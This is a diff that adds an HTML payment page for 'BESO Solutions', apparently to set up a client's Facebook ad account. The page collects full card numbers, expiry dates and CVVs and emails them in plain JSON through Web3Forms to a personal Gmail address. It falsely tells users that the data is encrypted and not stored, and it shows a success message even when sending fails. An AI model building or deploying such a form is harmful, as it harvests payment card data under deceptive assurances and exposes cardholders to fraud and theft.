@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Information - BESO Solutions</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #ffffff;
+            border: 2px solid #00ff88;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 255, 136, 0.2);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #000000;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #64748b;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            color: #000000;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .info-box {
+            background: #f8fafc;
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-size: 0.9rem;
+            color: #475569;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-family: inherit;
+            transition: all 0.3s;
+            background: #f8fafc;
+            color: #000000;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00ff88;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 255, 136, 0.1);
+        }
+
+        .input-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #00ff88;
+            color: #000000;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #00dd77;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .security-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: #64748b;
+        }
+
+        .security-icon {
+            color: #00ff88;
+            font-size: 1.2rem;
+            margin-right: 5px;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            color: #00ff88;
+            margin-bottom: 20px;
+        }
+
+        .success-message h2 {
+            color: #000000;
+            margin-bottom: 10px;
+        }
+
+        .success-message p {
+            color: #475569;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            .input-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-text">BESO Solutions</div>
+        </div>
+        <div class="subtitle">Back End Scaling & Operations</div>
+
+        <div id="formContainer">
+            <h1>Payment Information</h1>
+            
+            <div class="info-box">
+                <strong>🔒 Secure Collection</strong><br>
+                Your payment information will be sent directly to BESO Solutions to set up your Facebook ad account. This form does not store any card data.
+            </div>
+
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="cardName">Cardholder Name</label>
+                    <input type="text" id="cardName" name="cardName" required placeholder="John Doe">
+                </div>
+
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" name="cardNumber" required placeholder="1234 5678 9012 3456" maxlength="19">
+                </div>
+
+                <div class="input-row">
+                    <div class="form-group">
+                        <label for="expiry">Expiration Date</label>
+                        <input type="text" id="expiry" name="expiry" required placeholder="MM/YY" maxlength="5">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="4">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="zip">Billing Zip Code</label>
+                    <input type="text" id="zip" name="zip" required placeholder="12345" maxlength="10">
+                </div>
+
+                <button type="submit" class="submit-btn">Submit Payment Info</button>
+
+                <div class="security-note">
+                    <span class="security-icon">🔒</span>
+                    This information is encrypted and sent securely
+                </div>
+            </form>
+        </div>
+
+        <div id="successMessage" class="success-message">
+            <div class="success-icon">✅</div>
+            <h2>Payment Information Received!</h2>
+            <p>Thank you! Your payment details have been securely submitted. We'll add this to your Facebook ad account within the next few minutes.</p>
+            <p style="margin-top: 20px; font-size: 0.9rem;">You can safely close this page now.</p>
+        </div>
+    </div>
+
+    <script>
+        // Format card number with spaces
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        // Format expiry date
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Only allow numbers in CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Only allow numbers in zip
+        document.getElementById('zip').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Handle form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const formData = {
+                access_key: "YOUR_WEB3FORMS_ACCESS_KEY", // Get free key from web3forms.com
+                subject: "New Payment Information - NFG Financial Group",
+                from_name: "BESO Payment Form",
+                to_email: "besosolutionsgroup@gmail.com",
+                cardholder_name: document.getElementById('cardName').value,
+                card_number: document.getElementById('cardNumber').value,
+                expiry_date: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                billing_zip: document.getElementById('zip').value,
+                client_name: "NFG Financial Group",
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Send email via Web3Forms
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Email sent successfully:', data);
+                // Show success message
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Still show success to user
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
